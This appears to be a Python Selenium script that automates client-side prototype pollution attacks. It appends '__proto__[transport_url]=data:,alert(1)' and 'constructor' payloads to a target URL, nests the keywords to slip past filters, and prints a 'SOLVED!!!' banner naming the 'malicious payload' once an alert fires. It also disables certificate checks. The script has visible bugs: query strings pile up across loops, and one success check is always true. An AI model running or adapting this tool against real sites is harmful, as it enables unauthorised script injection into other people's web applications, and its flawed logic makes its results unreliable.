from rich.console import Console
from rich.text import Text
import typer
import urllib3
import warnings
from selenium import webdriver
from time import sleep
from selenium.common.exceptions import UnexpectedAlertPresentException as MaliciousAlert

# Disabilita tutti i warning
warnings.filterwarnings("ignore")
def pretty_print(url):
    text = Text()
    print(""">=>>=>       >===>      >=>       >=>         >=> >=======> >====>           >=>      >=>      >=>
>=>    >=>   >=>    >=>   >=>        >=>       >=>  >=>       >=>   >=>        >=>      >=>      >=>
 >=>       >=>        >=> >=>         >=>     >=>   >=>       >=>    >=>       >=>      >=>      >=>
   >=>     >=>        >=> >=>          >=>   >=>    >=====>   >=>    >=>       >>       >>       >> 
      >=>  >=>        >=> >=>           >=> >=>     >=>       >=>    >=>       >>       >>       >> 
>=>    >=>   >=>     >=>  >=>            >===>      >=>       >=>   >=>                             
  >=>>=>       >===>      >=======>       >=>       >=======> >====>           >=>      >=>      >=>
                                                                                                    """)
    text.append(f"This is the malicious payload {url}", style="bold magenta")
    return text
def main(url: str,number_of_times:int=10,file_output:str="payload"):
    c=Console()

    driver = webdriver.Chrome()
    driver.get(url)
    http = urllib3.PoolManager(cert_reqs='CERT_NONE', assert_hostname=False)
    evilString = "__proto__"
    evilString2 = "constructor"
    a = False
    for i in range(0,number_of_times):
        evilString = "__pro" + evilString + "to__"
        evilString += "[transport_url]=data:,alert(1);"
        url = url + "?"+evilString
        try:
            sleep(1)
            driver.get(url)
            sleep(2)
            print(driver.page_source)
        except MaliciousAlert as e:
            if "unexpected alert open: {Alert text : 1}" in e.msg:
                c.print(pretty_print(url))
                a = True
        if a:
            break
        evilString = evilString.replace("[transport_url]=data:,alert(1);","")
            
    if not a:
        for i in range(0,number_of_times):
            evilString2 = "const"+evilString2+"ructor"
            evilString2 += "[transport_url]=data:,alert(1);"
            url = url + "?" + evilString2
            try:
                sleep(1)
                driver.get(url)
                sleep(2)
                print(driver.page_source)
            except Exception as e:
                if "unexpected alert open: {Alert text : 1}":
                    c.print(pretty_print(url))

                    a = True
            if a:
                break
            evilString2 = evilString2.replace("[transport_url]=data:,alert(1);","")


if __name__ == "__main__":
    typer.run(main)
